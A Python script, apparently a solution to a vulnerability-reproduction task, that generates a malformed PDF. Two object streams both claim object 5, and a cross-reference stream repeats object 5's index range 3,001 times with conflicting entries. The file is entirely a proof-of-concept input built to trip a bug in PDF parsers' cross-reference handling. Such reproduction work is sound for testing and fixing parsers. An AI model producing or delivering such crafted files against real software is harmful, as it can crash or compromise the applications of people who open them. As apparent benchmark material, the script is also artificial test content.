import os
from typing import Dict, List, Tuple


class Solution:
    def solve(self, src_path: str) -> bytes:
        n_dups_obj5 = 3001  # create many duplicate xref entries for object 5

        def b(s: str) -> bytes:
            return s.encode("latin-1")

        def build_indirect_object(num: int, body: bytes) -> bytes:
            return b(f"{num} 0 obj\n") + body + b("\nendobj\n")

        def build_stream_object(num: int, dict_bytes: bytes, stream_data: bytes) -> bytes:
            return (
                b(f"{num} 0 obj\n")
                + dict_bytes
                + b("\nstream\n")
                + stream_data
                + b("\nendstream\nendobj\n")
            )

        def build_objstm_stream(objs: List[Tuple[int, bytes]]) -> Tuple[bytes, int]:
            # objs: list of (objnum, objdata) where objdata ends with newline ideally
            offsets: List[int] = []
            cur = 0
            for _, data in objs:
                offsets.append(cur)
                cur += len(data)

            header_parts: List[str] = []
            for (objnum, _), off in zip(objs, offsets):
                header_parts.append(f"{objnum} {off}")
            header = (" ".join(header_parts) + "\n").encode("ascii")
            first = len(header)
            stream_data = header + b"".join(data for _, data in objs)
            return stream_data, first

        def xref_entry(t: int, f2: int, f3: int) -> bytes:
            return bytes((t,)) + int(f2).to_bytes(4, "big") + int(f3).to_bytes(2, "big")

        # Object stream A: contains object 5 and 8
        obj5_a = b("<< /Kind /Obj5 /From (A) /N 1 >>\n")
        obj8_a = b("<< /Kind /Obj8 /From (A) /N 8 >>\n")
        objstm_a_data, objstm_a_first = build_objstm_stream([(5, obj5_a), (8, obj8_a)])
        objstm_a_dict = b(
            f"<< /Type /ObjStm /N 2 /First {objstm_a_first} /Length {len(objstm_a_data)} >>"
        )

        # Object stream B: contains object 5 and 6
        obj5_b = b("<< /Kind /Obj5 /From (B) /N 2 >>\n")
        obj6_b = b("<< /Kind /Obj6 /From (B) /N 6 >>\n")
        objstm_b_data, objstm_b_first = build_objstm_stream([(5, obj5_b), (6, obj6_b)])
        objstm_b_dict = b(
            f"<< /Type /ObjStm /N 2 /First {objstm_b_first} /Length {len(objstm_b_data)} >>"
        )

        # Core objects
        obj1_body = b("<< /Type /Catalog /Pages 2 0 R /Foo 5 0 R /Bar 6 0 R /Baz 8 0 R >>")
        obj2_body = b("<< /Type /Pages /Count 1 /Kids [3 0 R] >>")
        obj3_body = b("<< /Type /Page /Parent 2 0 R /MediaBox [0 0 100 100] >>")

        header = b("%PDF-1.5\n%\xE2\xE3\xCF\xD3\n")

        pdf = bytearray()
        pdf += header

        offsets: Dict[int, int] = {}

        def append_obj(num: int, obj_bytes: bytes) -> None:
            offsets[num] = len(pdf)
            pdf.extend(obj_bytes)

        append_obj(1, build_indirect_object(1, obj1_body))
        append_obj(2, build_indirect_object(2, obj2_body))
        append_obj(3, build_indirect_object(3, obj3_body))
        append_obj(4, build_stream_object(4, objstm_a_dict, objstm_a_data))
        append_obj(7, build_stream_object(7, objstm_b_dict, objstm_b_data))

        # XRef stream object number
        xref_objnum = 9
        offsets[xref_objnum] = len(pdf)

        # Build /Index with overlapping segments, repeating object 5 range many times
        index_numbers: List[str] = ["0", "10"]
        for _ in range(n_dups_obj5):
            index_numbers.extend(["5", "1"])
        index_str = " ".join(index_numbers)

        # Build xref stream entries (W [1 4 2])
        # Objects: 0..9 plus N duplicates for obj 5
        entries: List[bytes] = []
        entries.append(xref_entry(0, 0, 65535))  # obj 0 free
        entries.append(xref_entry(1, offsets[1], 0))  # obj 1
        entries.append(xref_entry(1, offsets[2], 0))  # obj 2
        entries.append(xref_entry(1, offsets[3], 0))  # obj 3
        entries.append(xref_entry(1, offsets[4], 0))  # obj 4 (ObjStm A)
        entries.append(xref_entry(2, 4, 0))  # obj 5 -> ObjStm A index 0 (initial)
        entries.append(xref_entry(2, 7, 1))  # obj 6 -> ObjStm B index 1
        entries.append(xref_entry(1, offsets[7], 0))  # obj 7 (ObjStm B)
        entries.append(xref_entry(2, 4, 1))  # obj 8 -> ObjStm A index 1
        entries.append(xref_entry(1, offsets[xref_objnum], 0))  # obj 9 (xref stream itself)

        # Duplicate entries for object 5, alternating between the two object streams
        # Ensure last duplicate points to ObjStm B (so resolution is stable even if last-wins)
        for i in range(n_dups_obj5):
            if i % 2 == 0:
                entries.append(xref_entry(2, 7, 0))  # obj 5 -> ObjStm B index 0
            else:
                entries.append(xref_entry(2, 4, 0))  # obj 5 -> ObjStm A index 0

        xref_stream_data = b"".join(entries)
        xref_length = len(xref_stream_data)

        xref_dict = b(
            f"<< /Type /XRef /Size 10 /Root 1 0 R /W [1 4 2] /Index [{index_str}] /Length {xref_length} >>"
        )
        xref_obj_bytes = build_stream_object(xref_objnum, xref_dict, xref_stream_data)
        pdf.extend(xref_obj_bytes)

        startxref = offsets[xref_objnum]
        pdf += b(f"startxref\n{startxref}\n%%EOF\n")

        return bytes(pdf)